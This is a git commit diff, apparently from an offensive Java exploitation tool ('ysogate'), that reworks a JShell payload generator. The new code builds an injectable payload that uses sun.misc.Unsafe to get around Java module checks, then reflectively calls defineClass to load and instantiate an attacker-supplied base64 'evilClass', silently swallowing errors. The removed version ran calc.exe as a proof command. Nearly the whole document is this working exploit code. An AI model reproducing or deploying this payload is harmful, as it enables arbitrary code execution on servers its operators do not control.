8ab4f6a1d246e37dd5eabd58f2f80fbe23e7b525
H4cking2theGate <h4cking2thegate@gmail.com>
2024-07-17 01:13:43 +0800

    fix JShell bug

--- src/main/java/com/h2tg/ysogate/controller/bypass/EvalConverter.java
+++ src/main/java/com/h2tg/ysogate/controller/bypass/EvalConverter.java
@@ -1,5 +1,7 @@
 package com.h2tg.ysogate.controller.bypass;
 
+import org.apache.commons.lang.StringEscapeUtils;
+
 import javax.el.ELProcessor;
 import java.util.Base64;
 
@@ -8,14 +10,34 @@ public class EvalConverter
 
     public static String LoadByJshell(String b64)
     {
-        String javacode = "" +
-                "System.out.println(\\\"123\\\");"+
-                "ClassLoader classLoader = Thread.currentThread().getContextClassLoader();" +
-                "String b64=\\\"" +b64+"\\\";" +
-                "byte[] bytes = Base64.getDecoder().decode(b64);" +
-                "classloader.defineClass(bytes, 0, bytes.length);";
-        String cmd="Runtime.getRuntime().exec(\\\"calc.exe\\\");";
-        return cmd;
+        String javacode =
+                "System.out.println(\"foo\");"+
+                        "  class e {" +
+                        "    static {" +
+                        "        try {" +
+                        "            String evilClassBase64 = \""+b64+"\";" +
+                        "            Class unsafeClass = Class.forName(\"sun.misc.Unsafe\");" +
+                        "            java.lang.reflect.Field unsafeField = unsafeClass.getDeclaredField(\"theUnsafe\");" +
+                        "            unsafeField.setAccessible(true);" +
+                        "            sun.misc.Unsafe unsafe = (sun.misc.Unsafe) unsafeField.get(null);" +
+                        "            Module module = Object.class.getModule();" +
+                        "            Class cls = e.class;" +
+                        "            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField(\"module\"));" +
+                        "            unsafe.getAndSetObject(cls, offset, module);" +
+                        "            java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, Integer.TYPE, Integer.TYPE);" +
+                        "            defineClass.setAccessible(true);" +
+                        "            byte[] bytecode = java.util.Base64.getDecoder().decode(evilClassBase64);" +
+                        "            Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), bytecode, 0, bytecode.length);" +
+                        "            clazz.newInstance();" +
+                        "        } catch (Exception e) {" +
+                        "        }" +
+                        "    }" +
+                        "}"+" e a = new e();"
+                ;
+        String escaped = StringEscapeUtils.escapeJava(javacode);
+//        System.out.println(javacode);
+//        System.out.println(escaped);
+        return escaped;
     }
 
     public static String LoadByJS(String b64)
